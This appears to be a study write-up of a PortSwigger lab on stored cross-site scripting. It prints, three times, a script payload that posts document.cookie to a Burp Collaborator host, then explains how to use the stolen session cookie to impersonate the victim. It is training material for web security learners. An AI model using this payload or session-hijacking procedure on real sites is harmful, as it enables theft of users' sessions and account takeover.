# Exploiting Cross-Site Scripting to Steal Cookies (PortSwigger Lab)

## Lab: Exploiting Cross-Site Scripting to Steal Cookies

### Lab URL

[https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies)

### High-Level Summary

**Objective:** Exploit a stored XSS vulnerability in the blog comment section to exfiltrate the victim's session cookie and use it to impersonate the victim.

#### Key Techniques & Concepts

* Stored Cross-Site Scripting (XSS)
* JavaScript Fetch API for Data Exfiltration
* Burp Collaborator for External Interactions

#### What Makes This Vulnerable?

* The web application reflects untrusted input into the blog comments without proper sanitization.
* The vulnerable context allows arbitrary JavaScript execution in the victim's browser.

***

### Steps to Exploit

1. **Set Up Burp Collaborator:**
   * Open **Burp Suite Professional** and navigate to the **Collaborator** tab.
   * Click **Copy to Clipboard** to obtain a unique Burp Collaborator subdomain.
2. **Submit Malicious Comment:**
   *   Post a comment on the blog using the following payload, replacing `BURP-COLLABORATOR-SUBDOMAIN` with the copied subdomain:

       ```html
       <script>
       fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
           method: 'POST',
           mode: 'no-cors',
           body: document.cookie
       });
       </script>
       ```
3. **Trigger the XSS:**
   * Wait for the victim to view the comments section where the payload was injected.
4. **Capture the Cookie:**
   * Go back to the **Collaborator** tab and click **Poll now**.
   * Confirm receipt of the HTTP request containing the victim's session cookie in the request body.
5. **Session Hijacking:**
   * Copy the captured session cookie.
   * Use **Burp Proxy** or the browser's developer tools to replace your own session cookie with the stolen one.
   * Navigate to `/my-account` to verify you have successfully impersonated the victim.

***

### Instructor Solution

#### Step 1: Confirm XSS Vulnerability

*   Navigate to the blog post comment section and submit a basic test payload:

    ```html
    <script>alert(1)</script>
    ```
* Confirm the alert box appears, verifying the XSS vulnerability.

#### Step 2: Construct the Payload

*   Submit the following JavaScript payload in a blog comment:

    ```html
    <script>
    fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
        method: 'POST',
        mode: 'no-cors',
        body: document.cookie
    });
    </script>
    ```

#### Step 3: Use Burp Collaborator

* Go to **Burp Collaborator**, copy the public subdomain, and insert it into the payload.
* Click **Poll now** after submission to verify incoming requests.

#### Step 4: Capture and Use the Cookie

* Extract the session cookie from the captured HTTP request.
* Open the **Application** tab in the browser's Developer Tools.
* Go to **Storage > Cookies** and replace the session cookie with the captured one.
* Change the URL to `/my-account` to access the victim's session.

âœ… **Lab completed successfully.**

***

### Explanation of Payloads and Techniques

#### How the Payload Works

* The `<script>` tag executes JavaScript in the victim's browser.
* `fetch()` makes an HTTP POST request to the attacker's **Burp Collaborator** server.
* `mode: 'no-cors'` is used to bypass CORS restrictions (explained below).
* `document.cookie` sends the current session cookie to the attacker.

#### What is CORS?

* **CORS (Cross-Origin Resource Sharing)** is a browser security feature that restricts web pages from making requests to a domain different from the one serving the web page.
* By default, web browsers block cross-origin requests due to security concerns.

#### Why Use `mode: 'no-cors'`?

* The `mode: 'no-cors'` setting in the `fetch()` API prevents the browser from blocking the request.
* However, when using `no-cors` mode, the response body cannot be read. This is acceptable here because the goal is to **send** data, not retrieve it.

#### Why This Works

* The blog comments feature directly reflects user input without sanitization.
* The victim automatically loads the comment, executing the XSS payload.
* The cookie is accessible in the JavaScript context due to the lack of `HttpOnly` flag on the session cookie.

***

### Tools and Commands

* **Burp Suite Professional:** Collaborator, Repeater
*   **Payload:**

    ```html
    <script>
    fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
        method: 'POST',
        mode: 'no-cors',
        body: document.cookie
    });
    </script>
    ```
* **Resources:** [PortSwigger XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
